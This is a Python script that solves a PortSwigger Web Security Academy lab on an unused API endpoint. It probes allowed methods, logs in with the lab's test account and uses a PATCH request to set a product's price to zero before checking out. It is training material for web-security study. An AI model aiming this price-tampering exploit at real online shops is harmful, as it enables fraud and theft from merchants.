# Finding and exploiting an unused API endpoint

# https://portswigger.net/web-security/api-testing/lab-exploiting-unused-api-endpoint

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t\t%s' % csrf)
	return csrf

def get_methods(s, url):
	print('[+] Trying to find allowed methods...\n')
	product_path = url + '/api/products/3/price'
	r = s.options(product_path)
	time.sleep(1)
	for h in r.headers:
		print(f'{h}:\t{r.headers[h]}')
	print(r.text)

def connect_as_wiener(s, url):
	print('\n[+] Trying to connect to the application as Wiener...')
	login_path = url + '/login'
	time.sleep(1)
	r = s.get(login_path)
	csrf_token = get_csrf_token(r)
	data_login = {'username': 'wiener', 'password': 'peter', 'csrf': csrf_token}
	r = s.post(login_path, data=data_login)
	time.sleep(1)
	if 'Your username is: wiener' in r.text:
		print('[+] Logged in as Wiener !')
		return r
	else:
		print('[-] Exploit failed to connect as Wiener <!>')
		sys.exit(-1)

def change_item_price(s, url):
	print('\n[+] Trying to change the price of Lightweight "l33t" Leather Jacket...')
	product_path = url + '/api/products/1/price'
	product_data = {
	'price': 0
	}
	r = s.patch(product_path, json=product_data, allow_redirects=False)
	time.sleep(1)
	print(r)
	print(r.text)

def add_to_cart(s, url):
	print('\n[+] Trying to add Lightweight "l33t" Leather Jacket to the basket...')
	cart_path = url + '/cart'
	cart_data = {
	'productId': '1',
	'redir': 'CART',
	'quantity': '1'
	}
	r = s.post(cart_path, data=cart_data)
	time.sleep(1)

def buy_jacket(s, url):
	print('\n[+] Trying to checkout to the basket...')
	cart_path = url + '/cart'
	checkout_path = url + '/cart/checkout'
	r = s.get(cart_path)
	time.sleep(1)
	csrf = get_csrf_token(r)
	checkout_data = {
	'csrf': csrf
	}
	r = s.post(checkout_path, data=checkout_data)
	time.sleep(1)


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Finding and exploiting an unused API endpoint')
	parser = argparse.ArgumentParser(description="[+] Lab: Finding and exploiting an unused API endpoint")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to exploit a hidden API endpoint to buy a Lightweight l33t Leather Jacket...\n')
			time.sleep(2)

			get_methods(s, url)
			connect_as_wiener(s, url)
			change_item_price(s, url)
			add_to_cart(s, url)
			buy_jacket(s, url)

			s.cookies.clear()
			s.headers.clear()
			time.sleep(3)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
